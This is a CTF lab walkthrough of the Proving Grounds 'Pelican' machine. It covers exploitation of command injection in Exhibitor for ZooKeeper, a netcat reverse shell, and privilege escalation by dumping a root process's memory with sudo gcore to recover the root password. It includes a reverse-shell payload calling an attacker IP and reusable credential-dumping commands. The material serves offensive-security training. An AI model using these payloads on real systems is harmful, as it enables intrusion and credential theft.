---

tags:

- ctf
    
- offsec
    
- proving-grounds
    
- linux
    
- command-injection
    
- rce
    
- exhibitor
    
- zookeeper
    
- reverse-shell
    
- netcat
    
- tty-upgrade
    
- sudo
    
- gcore
    
- process-memory
    
- credential-dumping
    
- strings
    
- privilege-escalation
    
- password-recovery
    
- root
    

---

# Pelican

## Overview

**Platform:** OffSec Proving Grounds  
**Operating System:** Linux  
**Initial Access:** Unauthenticated command injection in Exhibitor for ZooKeeper  
**Initial User:** `charles`  
**Privilege Escalation:** Abuse of passwordless `sudo` access to `gcore`  
**Credential Access:** Dump credentials from the memory of a privileged process  
**Final Access:** Root

### Key Techniques

- RustScan / Nmap enumeration
    
- SMB anonymous share testing
    
- Web application enumeration
    
- Identifying Exhibitor for ZooKeeper
    
- Unauthenticated command injection
    
- Reverse shell with Netcat
    
- Python PTY upgrade
    
- `sudo -l` enumeration
    
- GTFOBins-style sudo abuse
    
- Process enumeration with `ps auxww`
    
- Process memory dumping with `gcore`
    
- Credential extraction with `strings`
    
- Root password recovery
    
- `su` to root
    

---

# Attack Path

```text
Port Enumeration
        ↓
Discover Exhibitor for ZooKeeper
        ↓
Identify Command Injection
        ↓
Inject Netcat Reverse Shell
        ↓
Shell as charles
        ↓
sudo -l
        ↓
Passwordless gcore
        ↓
Enumerate Root Processes
        ↓
Identify password-store
        ↓
Dump Process Memory
        ↓
Extract Credentials with strings
        ↓
su - root
        ↓
Root Access
```

---

# 1. Initial Enumeration

Start with RustScan and automatically pass discovered ports to Nmap for detailed enumeration.

```bash
rustscan -a 192.168.116.98 --ulimit 5000 -- -A
```

This performs:

- Fast port discovery
    
- Service detection
    
- Default Nmap scripts
    
- OS detection
    
- Version enumeration
    

---

# 2. SMB Enumeration

SMB was exposed on:

```text
139/tcp
445/tcp
```

Check whether anonymous access is available.

```bash
smbmap -H 192.168.116.98
```

No useful anonymous shares were discovered.

> [!tip] Methodology  
> When SMB is exposed, always perform a quick anonymous-access check even if another service appears more promising.
> 
> Useful options include:
> 
> ```bash
> smbmap -H <TARGET>
> smbclient -L //<TARGET>/ -N
> ```

---

# 3. Web Application Discovery

The Nmap scan identified an HTTP service around ports `8080/8081`.

The service redirected to:

```text
http://192.168.116.98:8080/exhibitor/v1/ui/index.html
```

Browsing to the URL revealed:

```text
Exhibitor for ZooKeeper
```

This was the primary attack surface.

---

# 4. Identify the Command Injection Vulnerability

Research into Exhibitor revealed a remote command execution / command injection vulnerability.

The vulnerable functionality involved modification of the:

```text
java.env script
```

field.

Commands could be injected using command substitution syntax.

The walkthrough used:

```text
$(COMMAND)
```

This allowed arbitrary operating-system commands to execute.

> [!tip] Recognition Pattern  
> When an application exposes configuration fields that eventually become shell scripts, environment variables, startup commands, or command-line arguments, test whether shell metacharacters are interpreted.
> 
> Common command-injection syntax includes:
> 
> ```text
> ;
> &&
> ||
> |
> $()
> ``
> ```

---

# 5. Obtain a Reverse Shell

The injected payload was:

```bash
$(/bin/nc -e /bin/sh 192.168.45.249 4444 &)
```

The payload:

1. Executes `/bin/nc`
    
2. Connects to the attacker
    
3. Executes `/bin/sh`
    
4. Places the command in the background
    

---

# 6. Start the Listener

On the attacker machine:

```bash
nc -nvlp 4444
```

When the injected command executed, a reverse shell was received.

The resulting user was:

```text
charles
```

---

# 7. Upgrade the Shell

The initial shell was basic and lacked full terminal functionality.

Upgrade it using Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This provides a more usable Bash shell.

> [!tip] First Post-Exploitation Step  
> Once a shell is obtained, improve terminal functionality before performing extensive enumeration.
> 
> A stable TTY makes tools such as:
> 
> ```text
> sudo
> su
> vim
> less
> ```
> 
> much easier to use.

---

# 8. Check sudo Permissions

A high-value privilege escalation check is:

```bash
sudo -l
```

The user `charles` was allowed to execute:

```text
/usr/bin/gcore
```

with elevated privileges and without supplying a password.

Conceptually:

```text
charles
   ↓
sudo
   ↓
/usr/bin/gcore
   ↓
Runs with root privileges
```

This immediately creates a potential process-memory disclosure issue.

---

# 9. Understanding gcore

`gcore` generates a core dump of a running process.

Normally:

```bash
gcore <PID>
```

produces a file such as:

```text
core.<PID>
```

A core dump contains a snapshot of the process's memory.

That memory may contain:

- Passwords
    
- API keys
    
- Tokens
    
- Environment variables
    
- Command-line arguments
    
- Encryption keys
    
- Application secrets
    
- Database credentials
    

> [!tip] Key Principle  
> If you can run a memory-dumping tool as root, you may be able to read secrets belonging to processes running as root.

This is effectively a **privileged read primitive against process memory**.

---

# 10. Enumerate Running Processes

Before using `gcore`, identify useful processes.

```bash
ps auxww
```

The additional `ww` prevents command-line output from being truncated.

### Why `ww` Matters

```text
w  = wide output
ww = unlimited width
```

This can expose complete:

- Paths
    
- Arguments
    
- Credentials passed on command lines
    
- Configuration options
    

> [!tip] Process Enumeration  
> When looking for credential-bearing processes, use:
> 
> ```bash
> ps auxww
> ```
> 
> rather than relying on output that may truncate long commands.

---

# 11. Identify an Interesting Privileged Process

During process enumeration, the following stood out:

```text
/usr/bin/password-store
```

The process was running with:

```text
PID 494
```

Because the process was privileged and appeared to handle passwords, it was an excellent candidate for memory dumping.

> [!tip] Recognition Pattern  
> Interesting process names include things such as:
> 
> ```text
> password
> credential
> secret
> vault
> database
> backup
> auth
> token
> key
> ```
> 
> A process name alone does not guarantee useful secrets, but it can help prioritise targets.

---

# 12. Dump the Process Memory

Run `gcore` through sudo against the PID.

```bash
sudo /usr/bin/gcore 494
```

This generates:

```text
core.494
```

The important privilege boundary is:

```text
charles
     ↓
sudo gcore
     ↓
Root-owned process memory
     ↓
Readable core dump
```

---

# 13. Search the Core Dump for Credentials

Use `strings` to extract human-readable content.

```bash
strings core.494
```

Search through the output for:

- Passwords
    
- Usernames
    
- Authentication strings
    
- Application secrets
    

The walkthrough discovered valid credentials inside the process memory.

> [!tip] Recognition Pattern  
> Core files are binary, but sensitive information is frequently stored as plaintext strings in memory.
> 
> Always try:
> 
> ```bash
> strings core.<PID>
> ```

You can also reduce noise with:

```bash
strings core.<PID> | less
```

or:

```bash
strings core.<PID> | grep -i pass
```

---

# 14. Use the Recovered Credentials

The recovered credentials could potentially be tested against:

```text
SSH
su
application logins
other local users
```

In this machine, they were valid for the root account.

Switch user:

```bash
su - root
```

Enter the recovered password.

---

# 15. Root Access

Confirm privileges:

```bash
id
```

Expected result:

```text
uid=0(root)
```

Also verify:

```bash
whoami
```

Expected:

```text
root
```

At this point, the target is fully compromised.

---

# Reusable Initial Access Methodology

When encountering an unfamiliar web application:

```text
Identify application
        ↓
Identify version
        ↓
Research known vulnerabilities
        ↓
Understand vulnerable parameter
        ↓
Test low-impact command
        ↓
Obtain reverse shell
```

For command injection, first consider a harmless test such as:

```bash
$(id)
```

or:

```bash
$(whoami)
```

before immediately launching a reverse shell.

---

# Command Injection Recognition

Potentially dangerous functionality includes:

```text
Diagnostic tools
Ping / traceroute forms
Backup configuration
Script fields
Environment variable configuration
File conversion
Network configuration
Startup commands
Administrative configuration
```

Look for shell metacharacter interpretation:

```text
;
&&
||
|
$()
`command`
```

---

# Reusable Linux Privilege Escalation Methodology

Immediately after gaining access:

```bash
id
sudo -l
```

Then consider:

```bash
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ps auxww
```

The most important finding on Pelican was:

```text
sudo → gcore
```

---

# sudo Binary Analysis Workflow

Whenever `sudo -l` reveals an unusual binary:

```text
1. Identify what the binary does
2. Check GTFOBins
3. Read the man page
4. Check whether it:
   - reads files
   - writes files
   - executes commands
   - spawns a shell
   - loads libraries
   - dumps memory
   - allows path control
5. Determine what running it as root gives you
```

For `gcore`:

```text
Runs as root
     ↓
Can attach to privileged processes
     ↓
Can dump privileged process memory
     ↓
May disclose credentials
```

---

# Process Memory Credential Hunting

When you can inspect privileged process memory:

## Enumerate Processes

```bash
ps auxww
```

Look for interesting applications.

## Dump Process

```bash
sudo /usr/bin/gcore <PID>
```

## Extract Strings

```bash
strings core.<PID>
```

## Search for Password-Like Content

```bash
strings core.<PID> | grep -i pass
```

Other useful searches:

```bash
strings core.<PID> | grep -i user
strings core.<PID> | grep -i secret
strings core.<PID> | grep -i token
strings core.<PID> | grep -i key
```

---

# Quick Reference

## RustScan + Nmap

```bash
rustscan -a <TARGET> --ulimit 5000 -- -A
```

---

## SMB Anonymous Access

```bash
smbmap -H <TARGET>
```

---

## Netcat Reverse Shell Payload

```bash
$(/bin/nc -e /bin/sh <ATTACKER_IP> 4444 &)
```

---

## Netcat Listener

```bash
nc -nvlp 4444
```

---

## Python PTY Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Check sudo

```bash
sudo -l
```

---

## Enumerate Processes

```bash
ps auxww
```

---

## Dump Process Memory

```bash
sudo /usr/bin/gcore <PID>
```

---

## Extract Strings

```bash
strings core.<PID>
```

---

## Switch to Root

```bash
su - root
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Web application on unusual port|Identify application and version|
|Exhibitor / ZooKeeper management UI|Known RCE / command injection|
|Configurable script/environment field|Shell metacharacter injection|
|Command injection confirmed|Reverse shell|
|Shell as low-privileged user|`sudo -l`|
|Unusual sudo binary|GTFOBins / man page|
|`gcore` via sudo|Privileged process memory|
|Root process with interesting name|Dump memory|
|`password-store` process|Credentials in memory|
|Core dump created|`strings`|
|Root password recovered|`su - root`|

---

# Key Lessons

> [!tip] Identify What the Application Really Does  
> A configuration field may look harmless in the UI but become dangerous if its value is eventually inserted into a shell script or operating-system command.

> [!tip] Test sudo Early  
> `sudo -l` is one of the highest-value Linux privilege escalation checks and should usually be performed immediately after obtaining a stable shell.

> [!tip] Think in Capabilities, Not Just Shell Escapes  
> A sudo-enabled program does not need an obvious `sudo → shell` technique to be exploitable.
> 
> Ask what capability it gives you as root.

In Pelican:

```text
sudo gcore
```

does not directly produce:

```text
root shell
```

Instead it produces:

```text
Read root process memory
        ↓
Recover root password
        ↓
Root shell
```

> [!tip] Process Memory Is Sensitive  
> Applications routinely hold secrets in memory even when those secrets are not stored in readable files.

> [!tip] Prioritise Interesting Processes  
> If you gain process-memory access, do not dump every PID blindly. Look for applications likely to handle authentication, secrets, credentials, or administrative functionality.

> [!tip] Preserve Full Process Arguments  
> `ps auxww` is preferable during detailed enumeration because the full command line can reveal important context that truncated output hides.

---

# Privilege Escalation Concept

The core technique from Pelican can be generalised as:

```text
Low-Privilege User
        ↓
sudo Permission
        ↓
Privileged Diagnostic Tool
        ↓
Sensitive Information Disclosure
        ↓
Credential Recovery
        ↓
Privilege Escalation
```

This is an important reminder that **information disclosure itself can be a privilege escalation primitive**.

You do not always need:

```text
arbitrary command execution as root
```

If you can instead obtain:

```text
root credentials
SSH keys
tokens
passwords
sensitive configuration
```

that may provide an equally effective route to privileged access.

---

# Attack Chain Summary

```text
Exhibitor for ZooKeeper
        ↓
Unauthenticated Command Injection
        ↓
Netcat Reverse Shell
        ↓
charles
        ↓
sudo -l
        ↓
NOPASSWD: /usr/bin/gcore
        ↓
ps auxww
        ↓
/usr/bin/password-store
        ↓
sudo gcore <PID>
        ↓
core.<PID>
        ↓
strings
        ↓
Root Password
        ↓
su - root
        ↓
ROOT
```
